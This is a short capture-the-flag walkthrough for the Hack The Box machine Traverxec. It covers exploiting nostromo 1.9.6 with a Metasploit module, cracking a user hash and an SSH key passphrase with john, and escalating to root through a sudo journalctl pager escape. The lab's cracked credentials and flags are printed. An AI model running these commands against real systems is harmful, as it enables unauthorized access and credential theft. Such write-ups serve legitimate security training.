@@ -1,0 +1,40 @@
+We got only port 22 and 80 open. 
+
+A brief look and scan over the website and we get nothing exploitable.
+
+Looking into all directories we get an interesting php file [ lib/php-mail-form/validate.js ]
+
+Trying to access that and we encounter an error, 404. The footer is interesting [ <address>nostromo 1.9.6 at 10.10.10.165 Port 80</address> ]
+
+Searching on google we get a CVE 2019. So this should be exploitable. Fire up metasploit and use 'exploit/multi/http/nostromo_code_exec'
+
+Set the rhosts, lhost and fire up! Voila we got a low priv shell in minutes! Now let's make it preaty [ python -c 'import pty; pty.spawn("/bin/sh")' ]
+
+From LinEnum we got some interesting stuff. [ david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ]
+Let's crack the hash [ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt /media/sf_Hackthebox/Machines/Traverxec/hash ]
+
+Reading the documentation, gsp.com, we get that homedir is /home in which we have the david user! [ http://10.10.10.165/~david/ ] 
+Also, from the documentation we get that as www-data we have access to /home/david/public_www/protected-file-area 
+Here we find a backup-ssh-identity-files.tgz. Let's download id. In the david we got some ssh keys :P Let's crack them!
+First we convert it using ssh2john ( ssh2john.py id_rsa id_rsa.hash )
+Than we crack it with john [ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash ]
+Now we use it and got the user :P [ chmod 600 id_rsa & ssh -i id_rsa david@10.10.10.165 ] 
+
+Heading for the root
+We can see that in the bin is an interesting script, and in the last line we get a sudo cmd. [ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat ]
+Let's proccess it a little bit [ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service ]
+Now all we have to do is to to type '!/bin/bash' and we got the root.
+
+Rooted!
+
+Credentials
+-> david:Nowonly4me [$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/]
+-> passphrase: hunter
+
+Flags
+USER -> 7db0b48469606a42cec20750d9782f3d
+ROOT -> 9aa36a6d76f785dfd320a478f6e0d906 
+
+Articles
+https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd ( HOMEDIRS part )
+
